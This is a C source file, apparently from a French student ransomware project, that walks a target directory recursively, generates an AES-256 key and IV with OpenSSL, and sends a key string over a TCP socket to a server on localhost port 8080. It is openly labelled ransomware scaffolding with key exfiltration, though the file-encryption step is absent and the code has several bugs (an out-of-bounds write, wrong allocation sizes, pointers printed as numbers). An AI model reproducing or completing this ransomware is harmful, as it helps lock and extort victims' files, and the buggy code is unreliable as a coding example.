#include "ransomlib.h"
#include <dirent.h> // for socket
#include <sys/socket.h>
#include <unistd.h> 
#include <arpa/inet.h>

void usage()
{
	printf("--------------------------------------\n");
	printf("Bienvenue sur le projet de Ransomware\n");
	printf("--------------------------------------\n");
};

int is_encrypted(char *filename)
// ici on assume que le nom de nos fichiers cryptés seront en ".crp"
{
	int n = strlen(filename)-4;
	char extention[4] ;

	for(int i=0; i<5;i++)
	{
		extention[i] = filename[n+i];
	
	}

	if(strcmp(extention,".crp")==0)
	{
		printf("Le fichier est déja crypter");
		return 0 ;
	}
	else
	{
		printf("le fichier n'est pas encore crypter");
		return 1;
	}
}

//void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag)
void listdir(const char *name)
{

	DIR* dir = opendir(name);
	if (dir == NULL)
	{
		return;
	}
	struct dirent* entity;
	entity = readdir(dir);

	//    d_name = entity->d_name;
	//    d_type = entity->d_type;

	while (entity != NULL)
	{
		 if (entity->d_name[0] != '.')
		 {
			printf("[type of folder : %d]  %s/%s\n",entity->d_type,name,entity->d_name);
		 }
		if(entity->d_type == DT_DIR && strcmp(entity->d_name,".")!=0 && strcmp(entity->d_name,"..")!=0)
		{
			// if(strcmp(d_name, ".")!=0)
			char path[100] = {0};
			strcat(path,name);
			strcat(path,"/");
			strcat(path,entity->d_name);
			listdir(path);
		}
		entity = readdir(dir);
	}
	closedir(dir);
}

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv)
{
	if (!RAND_bytes(key, sizeKey) || !RAND_bytes(iv, sizeIv)) 
	{
		// fprintf(stderr, "L'erreur est %s\n", strerror(errno));
		// return errno;
		handleErrors();
	}
	
	printf("La clé : %d  l'IV : %d \n",key, iv);
	
	bytes_to_hexa(pKey , key, sizeKey);
	printf("La clé en hexa : %X\n", key);
	hexa_to_bytes(pKey, key, sizeKey);
	printf("La clé en byte : %d\n", key);
	
	bytes_to_hexa(pIv , iv, sizeIv);
	printf("L'IV en hexa : %X\n", iv);
	hexa_to_bytes(pIv, iv, sizeIv);
	printf("L'IV  en byte : %d\n", iv);
	
	// OPENSSL_cleanse(key,sizeof(key));	
	// OPENSSL_cleanse(iv,sizeof(iv));
}

//int send_key(char *pKey, char *pIv);
int send_key(char *pKey)
{
		int sockid;

        int server_port = 8080;
        char *server_ip = "127.0.0.1";
		char *key = "clé : JeSuisVraimentCon";
		
        sockid = socket(AF_INET,SOCK_STREAM,0);

        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(server_port);
        server_addr.sin_addr.s_addr = inet_addr(server_ip);

	// connect the client socket to server socket
	if (connect(sockid, (struct sockaddr *)&server_addr, sizeof(server_addr)) != 0) 
	{
		printf("Connection with the server failed...\n");
		exit(0);
	}
	else
	{
		printf("Connected to the server !\n");
		// printf("%d\n", pKey);
		send(sockid, (const char *)key, strlen(key),0);
	
        close(sockid);
	}
}

int main (int argc, char * argv[])
{
	usage();
	if(argc==1)
	{
		printf("./ransom <PATH>");
		handleErrors();
	}
	else if(argc==2)
	{
		printf("The directory is %s\n", argv[1]);
		listdir(argv[1]);
		unsigned char key[AES_256_KEY_SIZE+1];
		unsigned char iv[AES_BLOCK_SIZE+1];

		int sizeKey = AES_256_KEY_SIZE; 
		int sizeIv = AES_BLOCK_SIZE;
		
		char * pKey = (char *) malloc(sizeof((sizeKey)*2)+1);
		char * pIv = (char *) malloc(sizeof(sizeIv));

		generate_key(key, sizeKey, iv, sizeIv,pKey, pIv);
		send_key(pKey);
	}
}
